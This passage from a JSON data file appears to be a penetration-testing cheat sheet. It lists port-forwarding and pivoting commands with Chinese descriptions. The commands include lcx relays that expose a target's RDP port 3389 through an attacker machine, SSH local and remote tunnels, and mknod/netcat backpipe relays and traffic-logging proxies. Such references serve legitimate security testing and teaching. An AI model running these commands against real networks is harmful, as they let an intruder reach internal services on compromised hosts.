						"describe": "在攻击者机器上监听端口4567并将其转发到33891"
					},
					{
						"command": "lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets",
						"describe": "在目标机器上将端口4567转发到本地3389端口"
					}
				]
			},
			"SSH": {
				"Linux": [
					{
						"command": "ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]",
						"describe": "通过SSH进行端口转发，指定本地端口或远程端口"
					},
					{
						"command": "ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port",
						"describe": "将本地8080端口转发到远程服务器的80端口"
					},
					{
						"command": "ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port",
						"describe": "将远程服务器的8080端口转发到本地的80端口"
					}
				]
			},
			"mknod": {
				"Linux": [
					{
						"command": "mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe",
						"describe": "使用mknod创建命名管道，并使用nc进行端口转发"
					},
					{
						"command": "mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe",
						"describe": "使用mknod和nc将端口8080的数据转发到目标IP的80端口"
					},
					{
						"command": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)",
						"describe": "创建一个代理，将端口80的数据转发到8080，并记录数据流"
					},
					{
						"command": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)",
						"describe": "创建一个代理监视器，将端口80的数据转发到8080，并监控数据流"
					}
				]
			},
